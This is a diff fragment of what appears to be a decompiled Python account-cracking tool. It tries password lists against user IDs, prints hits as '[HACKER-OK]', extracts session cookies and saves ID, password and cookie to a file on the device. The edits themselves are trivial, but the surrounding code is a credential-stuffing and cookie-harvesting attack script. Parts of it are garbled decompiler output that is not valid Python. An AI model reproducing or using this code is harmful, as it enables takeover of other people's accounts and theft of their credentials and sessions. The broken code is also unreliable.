@@ -6553,7 +6553,7 @@ for xd in range(1000):
                     os.system('espeak -a 300 " Enter, Username, &,  Password "')
                     import getpass
                     attemps = 0
-                    if attemps < 0x2DFDC1848L:
+                    if attemps < 0x2DFDC18416L:
                         username = input(' \x1b[0;92mEnter Username: ')
                         password = input(' \x1b[0;93mEnter Password: ')
                         if username == '1' and password == '2':
@@ -6733,7 +6733,7 @@ def api1(ids, names, passlist):
             coki = (lambda .0: for i in .0:
 i['name'] + '=' + i['value']None)(po['session_cookies']())
             print('\r\r\x1b[1;32m[HACKER-OK]\x1b[1;32m ' + ids + '\x1b[1;32m |\x1b[1;32m ' + pas + '')
-            print(f'''\x1b[1;32m[COKIES-🍪] {coki}''')
+            print(f'''\x1b[1;32m[COKIES-??] {coki}''')
             linex()
             open('/sdcard/HACKER-FILE-M1-COOKIE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
             oks.append(ids)
